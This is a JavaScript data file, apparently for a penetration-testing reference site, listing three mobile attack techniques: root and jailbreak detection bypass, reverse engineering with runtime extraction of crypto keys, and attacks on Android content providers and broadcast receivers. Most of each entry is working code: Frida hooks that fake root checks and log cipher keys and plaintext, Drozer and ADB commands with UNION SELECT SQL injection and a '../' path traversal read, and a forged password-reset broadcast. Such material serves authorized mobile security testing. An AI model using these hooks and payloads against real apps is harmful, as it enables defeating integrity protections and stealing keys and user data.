export const mobileAdvancedTechniques = [
  {
    id: 'mob-root-detection-bypass',
    title: 'Root & Jailbreak Detection Bypass',
    subtitle: 'Defeat SafetyNet, Play Integrity, and application-level root checks with Frida and Magisk modules',
    tags: ['root detection', 'SafetyNet', 'Play Integrity', 'Magisk Hide', 'Frida bypass', 'jailbreak detection', 'RASP'],
    accentColor: 'red',
    overview: 'Production apps check for root/jailbreak using multiple layers: file system checks, SafetyNet/Play Integrity attestation, debugging flags, and Frida detection. Each layer requires a distinct bypass technique.',
    steps: [
      'File system checks: apps look for su binary, Magisk paths, Cydia.app — Magisk Hide / Shamiko removes them from process view',
      'SafetyNet bypass: use MagiskHide Props Config to spoof device fingerprint to a certified device',
      'Play Integrity bypass: use Tricky Store + Shamiko to pass Strong attestation on rooted devices',
      'App-level root checks: hook RootBeer or custom check methods with Frida to return false',
      'Frida detection bypass: use Frida gadget embedded in APK instead of server, rename frida-server binary',
      'Anti-debugging: hook ptrace, TracerPid checks, and isDebuggerConnected with Frida',
    ],
    commands: [
      {
        title: 'Root and Frida detection bypass',
        code: `# Objection — disable root checks (covers RootBeer + common patterns)
objection -g com.target.app explore
android root disable

# Frida — bypass RootBeer
Java.perform(function() {
  var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
  RootBeer.isRooted.implementation = function() { return false; };
  RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() { return false; };
});

# Bypass generic file existence checks (su, magisk, etc.)
Java.perform(function() {
  var File = Java.use("java.io.File");
  File.exists.implementation = function() {
    var path = this.getAbsolutePath();
    if (path.indexOf("su") >= 0 || path.indexOf("magisk") >= 0 ||
        path.indexOf("busybox") >= 0) {
      return false;
    }
    return this.exists();
  };
});

# SafetyNet / Play Integrity — Magisk modules
# Install: Shamiko, PlayIntegrityFix, Tricky Store
# Configure: magisk --hide add com.target.app

# iOS jailbreak detection bypass
objection -g com.target.app explore
ios jailbreak disable

# Frida (iOS) — bypass common jailbreak file checks
ObjC.choose(ObjC.classes.NSFileManager, {
  callbacks: {
    onMatch: function(fm) {
      fm.fileExistsAtPath_.implementation = function(path) {
        if (path.toString().indexOf("Cydia") >= 0 || 
            path.toString().indexOf("jailbreak") >= 0) return false;
        return this.fileExistsAtPath_(path);
      };
    }
  }
});

# Anti-Frida detection (rename server binary)
cp frida-server frida-server-renamed
adb push frida-server-renamed /data/local/tmp/fs
adb shell su -c "/data/local/tmp/fs &"`
      }
    ]
  },
  {
    id: 'mob-binary-analysis',
    title: 'Binary Reverse Engineering & Cryptographic Analysis',
    subtitle: 'Reverse engineer compiled mobile binaries to extract hardcoded keys, logic, and crypto implementations',
    tags: ['jadx', 'Ghidra', 'r2', 'ARM disassembly', 'hardcoded keys', 'custom crypto', 'obfuscation', 'ProGuard'],
    accentColor: 'red',
    overview: 'Mobile binaries are compiled ARM code (iOS) or Dalvik/ART bytecode (Android). Reversing them reveals hardcoded secrets, custom cryptographic implementations, and business logic. Even ProGuard/R8 obfuscated code can be reconstructed with jadx.',
    steps: [
      'Decompile APK with jadx-gui: provides Java/Kotlin source view with cross-referencing',
      'Search for encryption: look for AES, Cipher.getInstance, SecretKeySpec, hard-coded key bytes',
      'Identify obfuscation: ProGuard renames classes to a/b/c — rename in jadx to track data flow',
      'Extract native libraries (.so): analyse with Ghidra or r2 for ARM assembly-level secrets',
      'Hook crypto functions with Frida to intercept key material and plaintext at runtime',
      'For iOS: use Ghidra or r2 on the ARM64 Mach-O binary; Frida to intercept CommonCrypto functions',
    ],
    commands: [
      {
        title: 'Static reverse engineering and crypto extraction',
        code: `# jadx-gui — open and navigate decompiled APK
jadx-gui app.apk
# Search → Full text search → "AES" / "SecretKey" / "encrypt"
# Navigation: click class names to follow data flow

# Find hardcoded crypto keys in smali
grep -r "const-string\|const/4\|const-wide" app_decoded/smali/ | grep -iE "key|secret|pass" | head -30

# Frida — intercept AES encryption (extract key + plaintext)
Java.perform(function() {
  var Cipher = Java.use("javax.crypto.Cipher");
  Cipher.doFinal.overload("[B").implementation = function(input) {
    console.log("[Cipher.doFinal] Input: " + Java.array("byte", input));
    var result = this.doFinal(input);
    console.log("[Cipher.doFinal] Output: " + Java.array("byte", result));
    return result;
  };
  
  var SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
  SecretKeySpec.$init.overload("[B","java.lang.String").implementation = function(key, alg) {
    console.log("[SecretKeySpec] Algorithm: " + alg);
    console.log("[SecretKeySpec] Key: " + Java.array("byte", key));
    return this.$init(key, alg);
  };
});

# Extract and analyse native library
unzip app.apk lib/arm64-v8a/libnative.so -d ./
r2 ./lib/arm64-v8a/libnative.so
# In radare2:
[0x00000000]> aaa           # analyse all
[0x00000000]> is            # list symbols
[0x00000000]> pdf @ sym.Java_com_target_app_NativeLib_decrypt  # disassemble function

# Ghidra — import .so or iOS binary
# File → Import File → select binary
# Auto-analysis → function decompiler view
# Search → Memory → for hex key patterns

# iOS — intercept CommonCrypto
frida -U -f com.target.app -l intercept_crypto.js
// intercept_crypto.js
Interceptor.attach(Module.findExportByName("libSystem.B.dylib", "CCCrypt"), {
  onEnter: function(args) {
    console.log("[CCCrypt] op: " + args[0] + " alg: " + args[1]);
    console.log("[CCCrypt] key: " + Memory.readByteArray(args[4], parseInt(args[5])));
  }
});`
      }
    ]
  },
  {
    id: 'mob-ipc-attacks',
    title: 'IPC & Broadcast Receiver Attacks',
    subtitle: 'Exploit insecure inter-process communication, sticky broadcasts, and unprotected content providers',
    tags: ['IPC', 'broadcast receiver', 'content provider', 'SQL injection', 'Drozer', 'path traversal', 'sticky broadcast'],
    accentColor: 'red',
    overview: 'Android IPC mechanisms — content providers, broadcast receivers, and bound services — are frequently exported without proper permission checks. Accessing them directly or injecting via SQL/path traversal in content URIs can lead to data theft and privilege escalation.',
    steps: [
      'Enumerate exported content providers and test each with ADB or Drozer for SQL injection and path traversal',
      'Query content providers directly to extract data not accessible via the app UI',
      'Send custom broadcasts to exported receivers — test for command injection or authentication bypass',
      'Test bound services via AIDL interfaces for unauthorized method invocation',
      'Check for sticky broadcasts containing sensitive data retrievable by any app',
      'Test content provider file access (openFile) for path traversal to read arbitrary files',
    ],
    commands: [
      {
        title: 'Content provider and broadcast attacks',
        code: `# Drozer — enumerate and attack content providers
adb forward tcp:31415 tcp:31415
drozer console connect

# List all content providers
run app.provider.info -a com.target.app

# Query content provider (like SQLi on the URI)
run app.provider.query content://com.target.app.provider/users
run app.provider.query content://com.target.app.provider/users --projection "* FROM users--"

# SQL injection in content provider
run app.provider.query content://com.target.app.provider/users \\
  --selection "1=1"
run app.provider.query content://com.target.app.provider/users \\
  --selection "1=1 UNION SELECT name,password,null FROM sqlite_master--"

# Path traversal in content provider (file access)
run app.provider.read content://com.target.app.provider/../../../../../../etc/hosts

# ADB direct content query
adb shell content query --uri content://com.target.app.provider/accounts
adb shell content query --uri "content://com.target.app.provider/accounts" \\
  --where "1=1 UNION SELECT name FROM sqlite_master--"

# Send broadcast to exported receiver
adb shell am broadcast -a com.target.app.RESET_PASSWORD \\
  -e email "admin@target.com" \\
  -n com.target.app/.receivers.AuthReceiver

# Frida — intercept incoming broadcasts
Java.perform(function() {
  var BroadcastReceiver = Java.use("android.content.BroadcastReceiver");
  BroadcastReceiver.onReceive.implementation = function(context, intent) {
    console.log("[BroadcastReceiver] Action: " + intent.getAction());
    console.log("[BroadcastReceiver] Extras: " + intent.getExtras());
    this.onReceive(context, intent);
  };
});`
      }
    ]
  },
];